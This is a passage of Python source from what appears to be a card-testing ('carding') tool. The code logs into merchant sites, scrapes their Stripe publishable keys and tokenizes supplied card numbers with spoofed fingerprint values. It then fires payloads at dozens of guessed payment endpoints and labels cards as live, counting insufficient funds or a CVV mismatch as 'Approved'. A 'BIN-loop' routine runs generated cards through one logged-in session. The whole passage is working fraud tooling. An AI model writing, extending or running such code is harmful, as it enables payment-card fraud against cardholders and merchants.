    # ── Subscription / Membership path ────────────────────────────────────────
    # For subscription sites we skip the Shopify cart entirely and instead:
    #   1. Pull the pricing / plan page to get the Stripe PK
    #   2. Tokenize the card
    #   3. POST to common subscription endpoints
    if source == "subscription_scrape":
        pricing_page = product_info.get("pricing_page") or product_url or site_url

        # Collect candidate pages where the PK might live
        candidate_pages = list(dict.fromkeys([
            pricing_page, product_url, site_url,
            site_url + "/pricing", site_url + "/plans",
            site_url + "/checkout", site_url + "/subscribe",
            site_url + "/membership",
        ]))

        stripe_pk = None
        page_html  = ""
        for page in candidate_pages:
            if not page:
                continue
            try:
                rp = session.get(page, timeout=15, allow_redirects=True)
                protection_error = _detect_bot_protection(rp)
                if protection_error:
                    return {"status": "error", "message": f"Bot protection at subscription page: {protection_error}", "stripe_pk": None}
                if _detect_captcha(rp.text):
                    return {"status": "error", "message": "Site requires CAPTCHA at subscription page — cannot auto-hit", "stripe_pk": None}
                if rp.status_code == 200:
                    pk = _extract_stripe_pk(rp.text)
                    if pk:
                        stripe_pk = pk
                        page_html  = rp.text
                        break
                    # Keep the html of the first 200-OK page for CSRF
                    if not page_html:
                        page_html = rp.text
            except Exception:
                continue

        # Also try linked JS files if PK still missing
        if not stripe_pk and page_html:
            for js_url in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page_html, re.IGNORECASE):
                if any(k in js_url.lower() for k in ("stripe", "checkout", "payment", "billing")):
                    try:
                        rj = session.get(urljoin(site_url, js_url), timeout=10)
                        stripe_pk = _extract_stripe_pk(rj.text)
                        if stripe_pk:
                            break
                    except Exception:
                        continue

        if not stripe_pk:
            return {
                "status": "error",
                "message": "Stripe PK not found on subscription/pricing pages",
                "stripe_pk": None,
            }

        # Tokenize card
        cc = card["cc"]; mm = card["mm"]; yy = card["yy"]; cvv = card["cvv"]

        def _rand_fp2():
            r = lambda a, b: random.randint(a, b)
            return f"{r(10000000,99999999)}-{r(1000,9999)}-{r(1000,9999)}-{r(1000,9999)}-{r(100000000000,999999999999)}"

        try:
            sub_stripe_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data={
                    "type": "card",
                    "card[number]": cc, "card[cvc]": cvv,
                    "card[exp_month]": mm, "card[exp_year]": yy,
                    "guid": _rand_fp2(), "muid": _rand_fp2(), "sid": _rand_fp2(),
                    "key": stripe_pk,
                },
                headers={
                    "authority": "api.stripe.com", "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
                    "user-agent": USER_AGENT,
                },
                timeout=20,
            ).json()
        except Exception as e:
            return {"status": "error", "message": f"Stripe API error: {str(e)[:50]}", "stripe_pk": stripe_pk}

        if "error" in sub_stripe_resp:
            err = sub_stripe_resp["error"]
            code = err.get("code", "")
            msg  = err.get("message", "Card Declined")
            _decline_map = {
                "incorrect_number": "Incorrect Card Number",
                "invalid_number": "Invalid Card Number",
                "invalid_expiry_year": "Invalid Expiry Year",
                "invalid_expiry_month": "Invalid Expiry Month",
                "invalid_cvc": "Invalid CVC",
                "expired_card": "Expired Card",
            }
            return {"status": "declined", "message": f"Declined - {_decline_map.get(code, msg)}", "stripe_pk": stripe_pk}

        payment_id = sub_stripe_resp.get("id")
        if not payment_id:
            return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}

        # ── Gather all HTML + linked JS text for endpoint extraction ────────────
        hidden = _extract_form_fields(page_html)
        csrf   = (hidden.get("csrf_token") or hidden.get("_token")
                  or hidden.get("authenticity_token") or hidden.get("_wpnonce") or "")

        all_js_text = page_html  # start with inline JS in the HTML

        # Pull every JS file referenced on the page that sounds payment-related
        _PAYMENT_JS_KW = ("stripe", "checkout", "payment", "billing", "subscribe",
                          "membership", "purchase", "order", "cart")
        for js_src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page_html, re.IGNORECASE):
            if any(k in js_src.lower() for k in _PAYMENT_JS_KW):
                try:
                    rj = session.get(urljoin(site_url, js_src), timeout=10)
                    if rj.status_code == 200:
                        all_js_text += rj.text
                        # Also look for the Stripe PK in JS (may not be on HTML)
                        if not stripe_pk:
                            stripe_pk = _extract_stripe_pk(rj.text) or stripe_pk
                except Exception:
                    pass

        # ── Extract real endpoints from HTML forms and JS fetch/axios calls ────
        def _extract_sub_endpoints_from_source(html_js: str, base: str) -> list[tuple[str, str]]:
            found: list[tuple[str, str]] = []
            _PAY_KW = re.compile(
                r'pay|checkout|subscri|billing|purchase|charge|order|enroll|join|membership',
                re.IGNORECASE,
            )

            # 1. Form actions
            for m in re.finditer(
                r'<form[^>]*action=["\']([^"\']+)["\']',
                html_js, re.IGNORECASE,
            ):
                href = m.group(1).strip()
                if _PAY_KW.search(href) or "stripe" in href.lower():
                    url = urljoin(base, href) if not href.startswith("http") else href
                    if url.startswith(("http://", "https://")):
                        found.append((url, "form"))

            # 2. data-action / data-url attributes
            for m in re.finditer(
                r'data-(?:action|url|endpoint|href)=["\']([^"\']+)["\']',
                html_js, re.IGNORECASE,
            ):
                href = m.group(1).strip()
                if _PAY_KW.search(href):
                    url = urljoin(base, href) if not href.startswith("http") else href
                    if url.startswith(("http://", "https://")):
                        found.append((url, "json"))

            # 3. fetch / axios.post / $.post / XMLHttpRequest calls in JS
            for pat in [
                r"""(?:fetch|axios\.post|axios\.put|\$\.post|\.open\s*\(\s*['"]POST['"])\s*\(\s*['"]([^'"]{4,120})['"]""",
                r"""url\s*:\s*['"]([^'"]{4,120})['"][^}]{0,60}method\s*:\s*['"]POST['"]""",
                r"""method\s*:\s*['"]POST['"][^}]{0,60}url\s*:\s*['"]([^'"]{4,120})['"]""",
            ]:
                for m in re.finditer(pat, html_js, re.IGNORECASE):
                    href = m.group(1).strip()
                    if _PAY_KW.search(href) or "stripe" in href.lower():
                        url = urljoin(base, href) if not href.startswith("http") else href
                        if url.startswith(("http://", "https://")):
                            found.append((url, "json"))

            # Deduplicate while preserving order
            seen: set[str] = set()
            deduped: list[tuple[str, str]] = []
            for ep in found:
                if ep[0] not in seen:
                    seen.add(ep[0])
                    deduped.append(ep)
            return deduped

        extracted = _extract_sub_endpoints_from_source(all_js_text, site_url)

        # ── Static fallback endpoints (common SaaS / CMS patterns) ─────────────
        _STATIC_ENDPOINTS: list[tuple[str, str]] = [
            # Generic REST
            (f"{site_url}/api/subscribe",              "json"),
            (f"{site_url}/api/subscription",           "json"),
            (f"{site_url}/api/subscriptions",          "json"),
            (f"{site_url}/api/billing",                "json"),
            (f"{site_url}/api/payment",                "json"),
            (f"{site_url}/api/payments",               "json"),
            (f"{site_url}/api/checkout",               "json"),
            (f"{site_url}/api/orders",                 "json"),
            (f"{site_url}/api/purchase",               "json"),
            (f"{site_url}/api/charge",                 "json"),
            (f"{site_url}/api/v1/subscribe",           "json"),
            (f"{site_url}/api/v1/subscriptions",       "json"),
            (f"{site_url}/api/v1/payments",            "json"),
            (f"{site_url}/api/v1/checkout",            "json"),
            (f"{site_url}/api/v2/subscribe",           "json"),
            # Stripe-named
            (f"{site_url}/stripe/charge",              "json"),
            (f"{site_url}/stripe/subscribe",           "json"),
            (f"{site_url}/stripe/payment",             "json"),
            (f"{site_url}/stripe/webhook",             "json"),
            # Payment-named
            (f"{site_url}/payment/subscribe",          "json"),
            (f"{site_url}/payment/process",            "json"),
            (f"{site_url}/payment/checkout",           "json"),
            (f"{site_url}/payments/create",            "json"),
            # Membership / subscription platforms
            (f"{site_url}/membership/checkout",        "form"),
            (f"{site_url}/membership/subscribe",       "form"),
            (f"{site_url}/members/checkout",           "form"),
            (f"{site_url}/subscribe",                  "form"),
            (f"{site_url}/checkout",                   "form"),
            (f"{site_url}/purchase",                   "form"),
            (f"{site_url}/enroll",                     "form"),
            (f"{site_url}/join",                       "form"),
            # WordPress / WooCommerce
            (f"{site_url}/wp-admin/admin-ajax.php",    "form"),
            (f"{site_url}/?wc-ajax=checkout",          "form"),
            (f"{site_url}/?wc-ajax=update_order_review", "json"),
            # Teachable / Kajabi / Podia
            (f"{site_url}/purchase",                   "json"),
            (f"{site_url}/purchases",                  "json"),
            (f"{site_url}/orders",                     "json"),
        ]

        # Extracted real endpoints go first (higher confidence)
        all_endpoints = extracted + [ep for ep in _STATIC_ENDPOINTS if ep[0] not in {e[0] for e in extracted}]

        _APPROVE_SIGNALS = re.compile(
            r'requires_action|3ds|authentication_required|succeeded|success|approved|active'
            r'|subscri(?:bed|ption)|charged|paid|complete|enrolled|welcome',
            re.IGNORECASE,
        )
        _DECLINE_SIGNALS = re.compile(
            r'declined|do_not_honor|insufficient_funds|card_declined|invalid_card|invalid_cvc'
            r'|expired_card|lost_card|stolen_card|restricted_card|blocked|fail(?:ed|ure)',
            re.IGNORECASE,
        )

        # Build payloads that cover old (stripeToken) and new (payment_method) Stripe APIs
        def _make_payloads(pm_id: str, tok_id: str, csrf_val: str, extra: dict) -> list[tuple[dict, str]]:
            """Return (payload_dict, format) pairs to try for each endpoint."""
            base = {**extra, "_token": csrf_val, "csrf_token": csrf_val, "authenticity_token": csrf_val}
            return [
                # New Stripe API (payment method)
                ({**base, "payment_method": pm_id, "payment_method_id": pm_id,
                  "paymentMethodId": pm_id, "stripe_payment_method": pm_id}, "json"),
                # Old Stripe API (token)
                ({**base, "stripeToken": tok_id, "stripe_token": tok_id,
                  "token": tok_id, "stripe_source": tok_id}, "json"),
                # Combined
                ({**base, "payment_method": pm_id, "stripeToken": tok_id,
                  "token": tok_id, "stripe_token": tok_id, "source": tok_id}, "json"),
                # Form-encoded (same fields)
                ({**base, "payment_method": pm_id, "stripeToken": tok_id,
                  "token": tok_id, "stripe_token": tok_id}, "form"),
            ]

        # Also create a Stripe Token (tok_...) — older sites use this instead of pm_...
        tok_id = payment_id  # default to pm_ if token creation fails
        try:
            tok_resp = requests.post(
                "https://api.stripe.com/v1/tokens",
                data={
                    "card[number]": cc, "card[cvc]": cvv,
                    "card[exp_month]": mm, "card[exp_year]": yy,
                    "key": stripe_pk,
                },
                headers={
                    "authority": "api.stripe.com", "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
                    "user-agent": USER_AGENT,
                },
                timeout=15,
            ).json()
            if "id" in tok_resp and tok_resp["id"].startswith("tok_"):
                tok_id = tok_resp["id"]
        except Exception:
            pass

        payloads = _make_payloads(payment_id, tok_id, csrf, hidden)

        tried: set[str] = set()
        for ep_url, _ep_fmt in all_endpoints:
            if ep_url in tried:
                continue
            tried.add(ep_url)
            for pay_data, pay_fmt in payloads:
                try:
                    if pay_fmt == "json":
                        r_ep = session.post(
                            ep_url, json=pay_data, timeout=20,
                            headers={"Accept": "application/json",
                                     "Content-Type": "application/json",
                                     "X-Requested-With": "XMLHttpRequest",
                                     "Referer": pricing_page or site_url},
                        )
                    else:
                        form_data = {**hidden, **pay_data}
                        r_ep = session.post(
                            ep_url, data=form_data, timeout=20, allow_redirects=True,
                            headers={"Referer": pricing_page or site_url},
                        )

                    if r_ep.status_code in (404, 405, 410):
                        break  # endpoint doesn't exist, skip remaining payloads for it

                    # Only check approve/decline signals on genuine JSON responses.
                    # HTML SPA shells often contain words like "subscription" or "active"
                    # in their nav/titles and must NOT be counted as payment approval.
                    ct = r_ep.headers.get("content-type", "")
                    is_json_response = "application/json" in ct
                    ep_json = None
                    if not is_json_response:
                        try:
                            ep_json = r_ep.json()
                            is_json_response = True
                        except Exception:
                            pass  # not JSON — skip signal check

                    if not is_json_response:
                        continue  # HTML / unknown — don't mistake page text for approval

                    ep_text = str(ep_json) if ep_json is not None else r_ep.text

                    if _APPROVE_SIGNALS.search(ep_text):
                        return {
                            "status": "approved",
                            "message": "Approved - Subscription charged",
                            "stripe_pk": stripe_pk,
                        }
                    if _DECLINE_SIGNALS.search(ep_text):
                        reason_m = re.search(
                            r'(?:message|error|decline_code)["\s:]+([^"}{,\n]{3,100})',
                            ep_text, re.IGNORECASE,
                        )
                        reason_str = reason_m.group(1).strip() if reason_m else "Card Declined"
                        return {
                            "status": "declined",
                            "message": f"Declined - {reason_str}",
                            "stripe_pk": stripe_pk,
                        }
                except Exception:
                    continue

        return {
            "status": "error",
            "message": (
                "Card tokenized OK but payment endpoint not reached "
                f"(tried {len(tried)} endpoints — site likely uses a JS-only or hosted checkout)"
            ),
            "stripe_pk": stripe_pk,
        }

    # ── Step 1: Add to cart (Shopify / generic) ───────────────────────────────
    cart_added = False
    if variant_id:
        try:
            r = session.post(
                f"{site_url}/cart/add.js",
                data={"id": str(variant_id), "quantity": "1"},
                headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest",
                         "Referer": site_url},
                timeout=15,
            )
            protection_error = _detect_bot_protection(r)
            if protection_error:
                return {"status": "error", "message": f"Bot protection at cart step: {protection_error}", "stripe_pk": None}
            if _detect_captcha(r.text):
                return {"status": "error", "message": "Site requires CAPTCHA at cart step — cannot auto-hit", "stripe_pk": None}
            if r.status_code == 200:
                cart_added = True
        except Exception:
            pass

    if not cart_added and product_url:
        try:
            r_prod = session.get(product_url, timeout=15)
            protection_error = _detect_bot_protection(r_prod)
            if protection_error:
                return {"status": "error", "message": f"Bot protection at product page: {protection_error}", "stripe_pk": None}
            if _detect_captcha(r_prod.text):
                return {"status": "error", "message": "Site requires CAPTCHA at product page — cannot auto-hit", "stripe_pk": None}
            if r_prod.status_code == 200:
                hidden = _extract_form_fields(r_prod.text)
                add_url_m = re.search(
                    r'<form[^>]+action=["\']([^"\']*cart[^"\']*)["\']',
                    r_prod.text, re.IGNORECASE
                )
                add_url = urljoin(product_url, add_url_m.group(1)) if add_url_m else f"{site_url}/cart/add"
                payload = {**hidden, "quantity": "1"}
                for m in re.finditer(
                    r'name=["\'](?:id|variant_id|product_id|add)["\'][^>]*value=["\']([^"\']+)["\']',
                    r_prod.text, re.IGNORECASE
                ):
                    payload.setdefault("id", m.group(1))
                r_add = session.post(add_url, data=payload, timeout=15, allow_redirects=True)
                protection_error = _detect_bot_protection(r_add)
                if protection_error:
                    return {"status": "error", "message": f"Bot protection at cart step: {protection_error}", "stripe_pk": None}
                if _detect_captcha(r_add.text):
                    return {"status": "error", "message": "Site requires CAPTCHA at cart step — cannot auto-hit", "stripe_pk": None}
                cart_added = True
        except Exception:
            pass

    # ── Step 2: Go to checkout and find Stripe PK ────────────────────────────
    stripe_pk = None
    checkout_html = ""
    last_checkout_protection_error: str | None = None
    for checkout_path in ["/checkout", "/cart", "/shop/checkout", "/order"]:
        try:
            r_co = session.get(site_url + checkout_path, timeout=20, allow_redirects=True)

            protection_error = _detect_bot_protection(r_co)
            if protection_error:
                last_checkout_protection_error = protection_error
                continue

            if _detect_captcha(r_co.text):
                return {"status": "error", "message": "Site requires CAPTCHA at checkout — cannot auto-hit", "stripe_pk": None}

            if r_co.status_code == 200:
                checkout_html = r_co.text
                stripe_pk = _extract_stripe_pk(checkout_html)
                if stripe_pk:
                    break
        except Exception:
            continue

    # Also try JS files linked from checkout page for PK
    if not stripe_pk and checkout_html:
        for js_url in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', checkout_html, re.IGNORECASE):
            if "stripe" in js_url.lower() or "checkout" in js_url.lower() or "payment" in js_url.lower():
                try:
                    full_js = urljoin(site_url, js_url)
                    rj = session.get(full_js, timeout=10)
                    stripe_pk = _extract_stripe_pk(rj.text)
                    if stripe_pk:
                        break
                except Exception:
                    continue

    if not stripe_pk:
        if last_checkout_protection_error:
            return {
                "status": "error",
                "message": f"Bot protection at checkout: {last_checkout_protection_error}",
                "stripe_pk": None,
            }
        return {
            "status": "error",
            "message": "Stripe PK not found on checkout page",
            "stripe_pk": None,
        }

    # ── Step 3: Tokenize card via Stripe API ─────────────────────────────────
    cc = card["cc"]
    mm = card["mm"]
    yy = card["yy"]
    cvv = card["cvv"]

    def _rand_fp():
        r = lambda a, b: random.randint(a, b)
        return (
            f"{r(10000000,99999999)}-{r(1000,9999)}-{r(1000,9999)}-"
            f"{r(1000,9999)}-{r(100000000000,999999999999)}"
        )

    stripe_headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": USER_AGENT,
    }
    stripe_data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": _rand_fp(),
        "muid": _rand_fp(),
        "sid": _rand_fp(),
        "key": stripe_pk,
    }

    try:
        r_stripe = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers=stripe_headers,
            timeout=20,
        )
        stripe_resp = r_stripe.json()
    except Exception as e:
        return {"status": "error", "message": f"Stripe API error: {str(e)[:50]}", "stripe_pk": stripe_pk}

    if "error" in stripe_resp:
        err = stripe_resp["error"]
        code = err.get("code", "")
        msg = err.get("message", "Card Declined")
        decline_map = {
            "incorrect_number": "Incorrect Card Number",
            "invalid_number": "Invalid Card Number",
            "invalid_expiry_year": "Invalid Expiry Year",
            "invalid_expiry_month": "Invalid Expiry Month",
            "invalid_cvc": "Invalid CVC",
            "expired_card": "Expired Card",
        }
        return {
            "status": "declined",
            "message": f"Declined - {decline_map.get(code, msg)}",
            "stripe_pk": stripe_pk,
        }

    payment_id = stripe_resp.get("id")
    if not payment_id:
        return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}

    # ── Step 4: Submit payment to merchant ───────────────────────────────────
    hidden = _extract_form_fields(checkout_html)
    csrf_token = hidden.get("csrf_token") or hidden.get("_token") or hidden.get("authenticity_token")

    odoo_data = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "data_set": "/payment/stripe/s2s/create_json_3ds",
            "stripe_publishable_key": stripe_pk,
            "return_url": "/shop/payment/validate",
            "csrf_token": csrf_token or "",
            "payment_method": payment_id,
        },
        "id": random.randint(100000, 999999),
    }
    payment_endpoints = [
        (f"{site_url}/payment/stripe/s2s/create_json_3ds", "json"),
        (f"{site_url}/checkout/payment", "form"),
        (f"{site_url}/shop/payment/validate", "form"),
    ]

    merchant_responded = False
    for ep_url, ep_type in payment_endpoints:
        try:
            if ep_type == "json":
                r_pay = session.post(ep_url, json=odoo_data, headers={
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": f"{site_url}/shop/payment",
                    "Accept": "application/json",
                }, timeout=20)
            else:
                r_pay = session.post(ep_url, data={
                    "payment_method_id": payment_id,
                    "stripeToken": payment_id,
                    "csrf_token": csrf_token or "",
                }, timeout=20, allow_redirects=True)

            # Only trust non-redirect, non-login responses
            if r_pay.status_code in (401, 403, 404):
                continue
            merchant_responded = True

            resp_text = r_pay.text.lower()
            try:
                resp_json = r_pay.json()
            except Exception:
                resp_json = {}

            result_str = str(resp_json).lower() + resp_text

            if any(k in result_str for k in ["authentication_required", "3d_secure", "requires_action"]):
                return {"status": "approved", "message": "Approved ♻️ 3D Secure Required", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["succeeded", '"success": true', "'success': true", "order_id", "thank you", "thank-you", "order confirmed"]):
                return {"status": "approved", "message": "Approved ✅ Transaction Successful", "stripe_pk": stripe_pk}
            if "insufficient_funds" in result_str:
                return {"status": "approved", "message": "Approved ♻️ Insufficient Funds", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["incorrect_cvc", "security code is incorrect"]):
                return {"status": "approved", "message": "Approved ♻️ CVV Mismatch", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["card was declined", "do_not_honor", "declined", "card_declined"]):
                return {"status": "declined", "message": "Declined ❌ Card Declined", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["incorrect_number", "invalid_number", "invalid_expiry"]):
                return {"status": "declined", "message": "Declined ❌ Invalid Card Details", "stripe_pk": stripe_pk}

        except Exception:
            continue

    # Stripe tokenization passed but merchant response was absent or ambiguous:
    # card passed Stripe validation but we cannot confirm charge outcome.
    if merchant_responded:
        return {
            "status": "error",
            "message": "Error - Merchant response was ambiguous (card tokenized OK)",
            "stripe_pk": stripe_pk,
        }
    return {
        "status": "error",
        "message": "Error - Could not reach merchant payment endpoint",
        "stripe_pk": stripe_pk,
    }


def setup_wah_session(site_url: str, email: str, password: str) -> dict:
    """
    Phase 1 of the BIN-loop pipeline: validate URL, login, find cheapest product.
    Returns {"ok": True, "session": s, "product": p, "site_url": url} on success
    or {"ok": False, "error": "..."} on failure.
    Call this once; pass the returned session+product to charge_wah_card() for
    each generated card so login/product-scrape overhead is paid only once.
    """
    try:
        site_url = _validate_url(site_url)
    except ValueError as ve:
        return {"ok": False, "error": f"Invalid URL: {ve}"}

    session = _make_session()

    login_result = login_to_site(session, site_url, email, password)
    if not login_result["ok"]:
        return {"ok": False, "error": f"Login failed: {login_result['error']}"}

    product = find_cheapest_product(session, site_url)
    if not product:
        return {"ok": False, "error": "No products or subscription plans found on site"}
    if isinstance(product, dict) and "error" in product:
        return {"ok": False, "error": product["error"]}

    return {"ok": True, "session": session, "product": product, "site_url": site_url}


def charge_wah_card(
    session: "requests.Session",
    site_url: str,
    product: dict,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
) -> dict:
    """
    Phase 2 of the BIN-loop pipeline: run checkout+charge for a single card
    against an already-logged-in session with a known product.
    Returns the same dict shape as run_wah() but without product_title/price
    (caller already knows those from setup_wah_session).
    """
    start = time.time()
    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    charge_result = checkout_and_charge(session, site_url, product, card)
    return {
        "status": charge_result["status"],
        "message": charge_result["message"],
        "stripe_pk": charge_result.get("stripe_pk"),
        "elapsed": round(time.time() - start, 2),
    }


def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Full pipeline: validate URL → login → find cheapest product → checkout → charge.
    Returns dict with keys: status, message, product_title, product_price,
    stripe_pk, elapsed.
    """
    start = time.time()

    # SSRF guard — validate before any network activity
    try:
        site_url = _validate_url(site_url)
    except ValueError as ve:
        return {
            "status": "error",
            "message": f"Invalid URL: {ve}",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    session = _make_session()

    # Login
    login_result = login_to_site(session, site_url, email, password)
    if not login_result["ok"]:
        return {
            "status": "error",
            "message": f"Login failed: {login_result['error']}",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    # Find cheapest product
    product = find_cheapest_product(session, site_url)
    if not product:
        return {
            "status": "error",
            "message": "No products found on site",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }
    if "error" in product:
        return {
            "status": "error",
            "message": product["error"],
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    charge_result = checkout_and_charge(session, site_url, product, card)

    return {
        "status": charge_result["status"],
        "message": charge_result["message"],
        "product_title": product["title"],
        "product_price": product["price"],
        "stripe_pk": charge_result.get("stripe_pk"),
        "elapsed": round(time.time() - start, 2),
    }
